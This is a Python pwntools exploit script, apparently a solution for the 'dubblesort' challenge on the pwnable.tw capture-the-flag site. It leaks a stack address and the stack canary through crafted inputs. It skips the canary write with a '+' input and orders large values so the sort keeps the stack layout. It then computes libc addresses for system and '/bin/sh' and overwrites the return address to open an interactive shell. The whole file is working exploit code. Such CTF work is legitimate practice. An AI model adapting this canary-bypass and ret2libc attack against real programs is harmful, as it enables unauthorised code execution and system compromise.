from pwn import *
import sys,getopt
import time

args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = './dubblesort'
local = 1 if '-r' not in args else 0
isattach = local & 1 
bps = isattach & 0 
ip = 'chall.pwnable.tw'
port = 10101
io = None


def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()
def lg(data):
    return log.info(data)


def attach():
    if isattach:
        if bps:
            gdb.attach(pidof(io)[0], open('bps'))
        else:
            gdb.attach(pidof(io)[0])
 
def pwn():
    makeio()
    if debug:
        context.log_level = 'debug'
    
    ru('name :')
    payload = 'A'*0x20
    sd(payload)
    data = u32(rv()[38:42])
    print hex(data)
    main_addr = data +  0x000003c2
    print 'main_addr' + hex(main_addr)
    sleep(0.1)
    sl('34')
    ru('number :')
    payload = '1\n'*24 + '+\n' + ('1342177280'+'\n')*5 + '+\n' + '1342177280'+'\n' + str(main_addr)+'\n' + '1342177280\n' # 1342177280 == 0x50000000
    sd(payload) 
    print 'wait sort'
    sleep(2)
    rl()
    rl()
    data = rv()
    print data 
    canary = int(data.split(' ')[24],10)
    libc3 = int(data.split(' ')[33],10)
    if canary < 0x50000000:
        print 'canary: ' + hex(canary)
        print 'libc_addr: ' + hex(libc3)
        print 'success' 

        if local:
            libc = ELF('libc.so')
            libc_addr = libc3 - 0x1b2000
        else:
            libc = ELF('libc_32.so.6')
            libc_addr = libc3 - 0x001b0000
        # attach()    
        binsh_offset = next(libc.search('/bin/sh'))
        system_offset = libc.symbols['system']        
        system_addr = libc_addr + system_offset
        binsh_addr = libc_addr + binsh_offset
        print 'system_addr ' + hex(system_addr)
        print 'binsh_addr ' + hex(binsh_addr)
       
        sleep(3)
        sl('A')
        ru('sort :') 
        sl('32')
        ru('number :')
        payload = '1\n'*24 + '+\n' + '1342177280\n'*4 + str(system_addr)+'\n' + str(binsh_addr)+'\n' + str(binsh_addr) +'\n'
        sd(payload)

        io.interactive()
        return True
    log.info('Attempt to try again.Wrong canary '+ hex(canary))
if __name__ == '__main__':
    success = False 
    while not success :
        success = pwn()
        
        


